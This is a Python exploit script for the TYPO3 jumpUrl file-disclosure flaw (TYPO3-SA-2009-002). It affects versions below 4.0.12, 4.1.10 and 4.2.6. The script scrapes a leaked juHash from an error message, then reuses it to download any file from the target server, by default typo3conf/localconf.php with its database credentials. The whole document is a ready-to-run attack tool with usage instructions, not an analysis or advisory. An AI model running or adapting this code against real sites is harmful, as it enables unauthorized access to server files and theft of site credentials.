TYPO3 < 4.0.12/4.1.10/4.2.6 (jumpUrl) Remote File Disclosure Exploit 
====================================================================


#!/usr/bin/env python
#
# ------------------------------------------------------------------------------
# TYPO3-SA-2009-002 exploit by Lolek of TK53 <lolek1337@gmail.com>
# date: 2009/02/10
# vendor url: http://typo3.org
# vulnerable versions: TYPO3 < 4.2.6, TYPO3 < 4.1.10, TYPO3 < 4.0.12
# usage:
#       typo3-sa-2009-002.py <host> <file> (defaults to typo3conf/localconf.php)
#
# if people fixed their installations but did not update the typo3 security key


import urllib,re,sys

strip = re.compile(r&#039;.*Calculated juHash, ([a-z0-9]+), did not.*&#039;)

def useme():
    print sys.argv[0], &#039;<host> (with http://) <file> (defaults to typo3conf/localconf.php)&#039;
    sys.exit(0)

def parsehash(host, f):
    file = urllib.urlencode({&#039;jumpurl&#039; : f, &#039;type&#039; : 0, &#039;juSecure&#039;: 1, &#039;locationData&#039; : &#039;1:&#039;})
    url = host + &#039;/index.php?&#039; + file
    try:
        s = urllib.urlopen(url)
        r = s.read()
    except Exception, e:
        print &#039;[!] - &#039;, str(e)
        return None

    tmp = strip.match(r)
    if tmp:
        return tmp.group(1)
    else:
        return None

def content(host, hash, f):
    file = urllib.urlencode({&#039;jumpurl&#039; : f, &#039;type&#039; : 0, &#039;juSecure&#039;: 1, &#039;locationData&#039; : &#039;1:&#039;, &#039;juHash&#039; : hash})
    url = host + &#039;/index.php?&#039; + file
    try:
        s = urllib.urlopen(url)
        print &#039;[+] - content of:&#039;, f
        print s.read()
    except:
        print &#039;[!] - FAIL&#039;

def main():
    if len(sys.argv) < 2:
        useme()

    if len(sys.argv) < 3:
        file = &#039;typo3conf/localconf.php&#039;
    else:
        file = sys.argv[2]

    print &#039;[+] - TYPO3-SA-2009-002 exploit by Lolek of TK53&#039;
    print &#039;[+] - checking typo3 installation on...&#039;

    hash = parsehash(sys.argv[1], file)

    if not hash:
        print &#039;[!] - version already fixed or 42 went wrong while trying to get the hash&#039;
        sys.exit(234)

    content(sys.argv[1], hash, file)


if __name__ == &#039;__main__&#039;:
    main()




